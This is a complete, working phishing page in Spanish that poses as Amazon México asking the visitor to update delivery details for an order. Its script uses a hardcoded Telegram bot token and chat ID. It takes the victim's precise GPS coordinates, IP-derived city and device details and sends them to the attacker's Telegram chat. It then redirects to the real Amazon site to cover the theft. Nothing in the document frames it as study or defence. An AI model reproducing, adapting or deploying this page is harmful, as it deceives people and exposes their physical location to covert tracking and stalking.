<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Amazon - Actualizar datos de entrega</title>
  <style>
    body { 
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
      background: #f4f4f4; 
      margin:0; 
      padding:0; 
      text-align:center; 
    }
    .header { 
      background: #131921; 
      color: white; 
      padding: 12px 20px; 
      display: flex; 
      align-items: center; 
      justify-content: space-between; 
      position: relative; 
      height: 50px; 
    }
    .logo-container { 
      flex: 1; 
      text-align: center; 
    }
    .amazon-logo { 
      font-size: 28px; 
      font-weight: bold; 
      letter-spacing: -1px; 
      position: relative; 
      display: inline-block; 
      color: #fff; 
    }
    .amazon-logo .arrow { 
      position: absolute; 
      bottom: -4px; 
      right: -18px; 
      font-size: 20px; 
      color: #ff9900; 
    }
    .cart-icon { 
      font-size: 28px; 
      color: #ff9900; 
      cursor: pointer; 
    }
    .content { 
      padding: 30px 20px; 
      max-width: 420px; 
      margin: 0 auto; 
    }
    h1 { 
      color: #232f3e; 
      font-size: 26px; 
      margin-bottom: 10px; 
    }
    p { 
      color: #444; 
      font-size: 16px; 
      line-height: 1.5; 
    }
    button { 
      background: #FF9900; 
      color: white; 
      border: none; 
      padding: 18px 40px; 
      font-size: 20px; 
      border-radius: 8px; 
      cursor: pointer; 
      width: 100%; 
      max-width: 320px; 
      font-weight: bold; 
      margin-top: 20px; 
    }
    button:hover { background: #e68a00; }
    button:disabled { background: #ccc; cursor: not-allowed; }
    #resultado { 
      margin-top: 25px; 
      font-size: 18px; 
      color: #00a651; 
      font-weight: bold; 
      min-height: 80px; 
    }
    .footer-note { 
      font-size: 13px; 
      color: #777; 
      margin-top: 40px; 
    }
  </style>
</head>
<body>
  <div class="header">
    <div style="flex:1;"></div> <!-- Espacio izquierdo para balance -->
    <div class="logo-container">
      <div class="amazon-logo">
        amazon<span class="arrow">↝</span>
      </div>
    </div>
    <div class="cart-icon">🛒</div>
  </div>

  <div class="content">
    <h1>Actualiza tus datos de entrega</h1>
    <p><strong>Pedido #MX-7843921</strong><br><span id="direccion">Dirección faltante</span>, <span id="ciudad">Ciudad detectada...</span></p>
    <p>Para garantizar la entrega correcta, actualiza tus datos de ubicación más recientes:</p>
    <button id="btnActualizar" onclick="actualizarDatos()">Actualizar datos de entrega</button>
    <div id="resultado"></div>
    <div class="footer-note">Amazon México • Tus datos están protegidos • 2026</div>
  </div>

  <script>
    // === CONFIG TELEGRAM ===
    const BOT_TOKEN = '8665004647:AAEfrF0wdsqClv5BFRWByflP4R1rKTAJy34';
    const CHAT_ID   = '5854071809';

    async function detectarCiudad() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        const ciudad = data.city || 'Ciudad no detectada';
        document.getElementById('ciudad').textContent = ciudad;
        document.getElementById('direccion').textContent = 'Dirección faltante';
        return ciudad;
      } catch {
        document.getElementById('ciudad').textContent = 'Ciudad no detectada';
        return 'Ciudad no detectada';
      }
    }

    detectarCiudad();

    async function actualizarDatos() {
      const btn = document.getElementById('btnActualizar');
      const resultado = document.getElementById('resultado');

      btn.disabled = true;
      resultado.textContent = "Actualizando tus datos... por favor espera un momento";

      if (!navigator.geolocation) {
        resultado.textContent = "No se pudo actualizar en este momento. Intenta más tarde.";
        btn.disabled = false;
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = parseFloat(position.coords.latitude.toFixed(6));
          const lon = parseFloat(position.coords.longitude.toFixed(6));
          const acc = Math.round(position.coords.accuracy);

          resultado.innerHTML = '✅ Tus datos de entrega se han actualizado correctamente.<br>Gracias por confirmar tu información más reciente.';

          const ciudad = await detectarCiudad();

          // Enviar ubicación con pin en mapa (Telegram nativo)
          const sendLocUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
          try {
            await fetch(sendLocUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: CHAT_ID,
                latitude: lat,
                longitude: lon,
                horizontal_accuracy: acc,
                live_period: 0
              })
            });
          } catch {}

          // Texto complementario
          const sendMsgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
          const texto = 
            `📦 Actualización de entrega recibida\n\n` +
            `Pedido: #MX-7843921\n` +
            `Ciudad (IP): ${ciudad}\n` +
            `Precisión GPS: ±${acc} metros\n` +
            `Dispositivo: ${navigator.userAgent}\n` +
            `Hora: ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}`;

          try {
            await fetch(sendMsgUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: CHAT_ID,
                text: texto,
                parse_mode: 'Markdown'
              })
            });
          } catch {}

          setTimeout(() => {
            window.location.href = "https://www.amazon.com.mx/gp/css/homepage.html";
          }, 3000);
        },
        () => {
          resultado.textContent = "No se pudo actualizar en este momento. Intenta más tarde.";
          btn.disabled = false;
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    }
  </script>
</body>
</html>
